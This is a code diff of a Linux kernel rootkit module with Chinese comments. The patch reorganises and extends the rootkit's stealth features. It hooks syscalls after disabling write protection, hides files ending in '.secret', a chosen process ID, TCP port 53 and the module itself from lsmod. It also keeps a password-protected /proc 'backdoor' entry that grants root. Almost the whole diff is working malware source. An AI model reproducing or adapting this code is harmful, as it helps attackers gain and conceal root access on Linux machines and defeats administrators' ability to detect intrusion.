@@ -15,19 +15,60 @@
 #include <net/tcp.h>
 MODULE_LICENSE("GPL");
 #include "RootKit.h"
-//后门
+
+//--------------------------------后门-----------------------------
 #define ROOT_PATH "/"
 #define PROC_PATH "/proc"
+#define BACKDOOR_NAME "backdoor"
+#define BACKDOOR_AUTH "password"
 
-//端口
+//创建与删除一个/proc下面的项目
+struct proc_dir_entry *entry;
+//static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
+void proc_remove(struct proc_dir_entry *entry);
+
+// Root后门
+ssize_t write_handler(struct file *filp, const char __user *buff, 
+				size_t count, loff_t *offp);
+struct file_operations proc_fops = {
+	.write = write_handler
+};
+
+//--------------------------------端口-----------------------------
 #define NEEDLE_LEN 6
 #define TMPSZ 150
 #define MAX_PORT 100
 #define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
 #define NET_ENTRY "/proc/net/tcp"
+ 
+// 需要隐藏的端口列表
+int port_list[MAX_PORT] = {53};
+// 隐藏端口列表长度
+int port_num = 1;
+// 端口隐藏
+int (* real_seq_show)(struct seq_file *seq, void *v);
+int fake_seq_show(struct seq_file *seq, void *v);
 
-#define BACKDOOR_NAME "backdoor"
-#define BACKDOOR_AUTH "password"
+
+
+//---------------------------文件/进程隐藏---------------------------
+// 文件系统根路径
+#define FS_ROOT_PATH "/"
+// /PROC根路径
+#define PS_ROOT_PATH "/proc"
+// 需要隐藏的文件后缀
+#define SECRET_FILENAME_SUFFIX ".secret"
+// 需要隐藏的pid
+#define SECRET_PROC 1
+
+int (*fs_real_iterate)(struct file *filp, struct dir_context *ctx);
+int (*fs_real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
+
+int (*ps_real_iterate)(struct file *filp, struct dir_context *ctx);
+int (*ps_real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);
+
+
+//-----------------------------RootKit原代码--------------------------------------------
 unsigned long cr0;
 static unsigned long *__sys_call_table;
 typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
@@ -41,27 +82,7 @@ orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
 
- // 需要隐藏的端口列表
-int port_list[MAX_PORT] = {53};
-// 隐藏端口列表长度
-int port_num = 1;
-// 端口隐藏
-int (* real_seq_show)(struct seq_file *seq, void *v);
-int fake_seq_show(struct seq_file *seq, void *v);
 
-//创建与删除一个/proc下面的项目
-struct proc_dir_entry *entry;
-static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
- 
-void
-proc_remove(struct proc_dir_entry *entry);
-// Root后门
-
-ssize_t write_handler(struct file *filp, const char __user *buff, 
-				size_t count, loff_t *offp);
-struct file_operations proc_fops = {
-	.write = write_handler
-};
 
 
 //function to get the address of the system call table
@@ -106,45 +127,6 @@ is_invisible(pid_t pid)
 	return 0;
 }
 
-//file hide
-bool should_hide_file(const char __user *filename)
-{
-    char *kern_buff = NULL;
-    int i;
-    bool to_hide = false;
-
-    
-    kern_buff = kzalloc(strlen(filename)+1, GFP_KERNEL);
-    if(!kern_buff)
-    {
-        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
-        goto cleanup;
-    }
-
-    if(copy_from_user(kern_buff, filename, strlen(filename)))
-    {   
-        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
-        goto cleanup;
-    }
-    
-
-    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
-    {
-        // Hidden file is found
-        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
-        {
-            to_hide = true;
-            break;
-        }
-    }
-    
-    //DEBUG("Exited HACKED OPEN");
-
-cleanup:
-    if(kern_buff)
-        kfree(kern_buff);
-    return to_hide;
-}
 
 // Intercepts open to see if the user is somehow trying
 // to open a file that we are hiding.
@@ -183,6 +165,96 @@ asmlinkage long hacked_stat(const char __user *filename,
     return ret;
 }*/
 
+//-------------------------------------文件/进程隐藏1---------------------------------
+// 检查文件后缀
+bool check_file_suffix(const char *name)
+{
+    int len = strlen(name);
+    int suffix_len = strlen(SECRET_FILENAME_SUFFIX);
+    if (len >= suffix_len)
+    {
+        const char *check_suffix = name;
+        check_suffix += len - suffix_len;
+        return strcmp(check_suffix, SECRET_FILENAME_SUFFIX) == 0;
+    }
+    return false;
+}
+
+// 用于隐藏文件的filldir
+int fs_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
+    if (check_file_suffix(name)) {
+        fm_alert("Hiding file: %s\n", name);
+        return 0;
+    }
+    return fs_real_filldir(ctx, name, namlen, offset, ino, d_type);
+}
+
+// 用于隐藏文件的iterate
+int fs_iterate(struct file *filp, struct dir_context *ctx) {
+    fs_real_filldir = ctx->actor;
+    *(filldir_t *) &ctx->actor = fs_filldir;
+    return fs_real_iterate(filp, ctx);
+}
+
+// 用于隐藏进程的filldir
+int ps_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
+    char *endp;
+    long pid;
+    pid = simple_strtol(name, &endp, 10);
+
+    if (pid == SECRET_PROC) {
+        fm_alert("Hiding pid: %ld\n", pid);
+        return 0;
+    }
+    return ps_real_filldir(ctx, name, namlen, offset, ino, d_type);
+}
+
+// 用于隐藏进程的iterate
+int ps_iterate(struct file *filp, struct dir_context *ctx) {
+    ps_real_filldir = ctx->actor;
+    *(filldir_t *) &ctx->actor = ps_filldir;
+    return ps_real_iterate(filp, ctx);
+}
+
+//--------------------------------------文件隐藏2---------------------------------------
+bool should_hide_file(const char __user *filename)
+{
+    char *kern_buff = NULL;
+    int i;
+    bool to_hide = false;
+
+    
+    kern_buff = kzalloc(strlen(filename)+1, GFP_KERNEL);
+    if(!kern_buff)
+    {
+        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
+        goto cleanup;
+    }
+
+    if(copy_from_user(kern_buff, filename, strlen(filename)))
+    {   
+        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
+        goto cleanup;
+    }
+    
+
+    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
+    {
+        // Hidden file is found
+        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
+        {
+            to_hide = true;
+            break;
+        }
+    }
+    
+    //DEBUG("Exited HACKED OPEN");
+
+cleanup:
+    if(kern_buff)
+        kfree(kern_buff);
+    return to_hide;
+}
 // Will hide any files from within the dirp and return the new length of dirp
 long handle_ls(struct linux_dirent *dirp, long length)
 {
@@ -306,7 +378,7 @@ error:
 
 //
 
-
+//-------------------------------------进程隐藏2---------------------------------------
 //function responsible for hiding processes (64 bit version)
 asmlinkage int
 hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
@@ -406,7 +478,7 @@ out:
 	return ret;
 }
 
-// 端口隐藏
+// ------------------------------端口隐藏---------------------------------
 int fake_seq_show(struct seq_file* seq, void *v) {
 	int i;
 	char needle[NEEDLE_LEN];
@@ -426,7 +498,7 @@ int fake_seq_show(struct seq_file* seq, void *v) {
 	return ret;
 }
 
-// root后门
+// -------------------------root后门----------------------------------
 ssize_t write_handler(struct file *filp, const char __user *buff, 
 				size_t count, loff_t *offp) {
 	char *kbuff;
@@ -459,6 +531,7 @@ ssize_t write_handler(struct file *filp, const char __user *buff,
 	kfree(kbuff);
 	return count;
 }
+//----------------------------原后门方案--------------------------------
 /*void
 give_root(void)
 {
@@ -482,6 +555,7 @@ tidy(void)
 	THIS_MODULE->sect_attrs = NULL;
 }
 
+//----------------------------lsmod模块隐藏和恢复——---------------------------
 static struct list_head *module_previous;
 static short module_hidden = 0;
 void
@@ -498,7 +572,8 @@ module_hide(void)
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
-// the hacked kill function which performs the normal kill operation besides our commands. 
+
+// --------------------------------hacker_kill-------------------------------
 asmlinkage int
 hacked_kill(pid_t pid, int sig)
 {
@@ -530,6 +605,7 @@ hacked_kill(pid_t pid, int sig)
 	return 0;
 }
 
+//------------------------2种开关写保护---------------------------
 static inline void
 protect_memory(void)
 {
@@ -541,7 +617,29 @@ unprotect_memory(void)
 {
 	write_cr0(cr0 & ~0x00010000);
 }
-// main function
+
+/*
+void disable_wp(void) {
+    unsigned long cr0;
+    preempt_disable();
+    cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+}
+
+// 打开写保护
+void enable_wp(void) {
+    unsigned long cr0;
+    preempt_disable();
+    cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+    preempt_enable();
+}
+*/
+
+//------------------------main function--------------------------
 static int __init
 RootKit_init(void)
 {
@@ -560,7 +658,14 @@ RootKit_init(void)
 	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
-        
+
+	//文件、进程隐藏
+    set_file_op(FS_ROOT_PATH, fs_iterate, fs_real_iterate);
+    set_file_op(PS_ROOT_PATH, ps_iterate, ps_real_iterate);
+    if (!fs_real_iterate || !ps_real_iterate) {
+        return -ENOENT;
+    }
+
 	return 0;
 }
 
@@ -571,14 +676,22 @@ RootKit_cleanup(void)
 	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
 	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
 	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
-        // root后门
+	//文件、进程隐藏
+	int (* dummy1)(struct file *, struct dir_context *);
+    if (fs_real_iterate) {
+        set_file_op(FS_ROOT_PATH, fs_real_iterate, dummy1);
+    }
+    if (ps_real_iterate) {
+        set_file_op(PS_ROOT_PATH, ps_real_iterate, dummy1);
+    }
+    // root后门
 	proc_remove(entry);
-        fm_alert("%s\n", "EXIT");
+    fm_alert("%s\n", "EXIT");
 	protect_memory();
-	void *dummy;
+	void *dummy2;
     if (real_seq_show) {
 	 	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, 
-						real_seq_show, dummy);
+						real_seq_show, dummy2);
 	}
 }
 
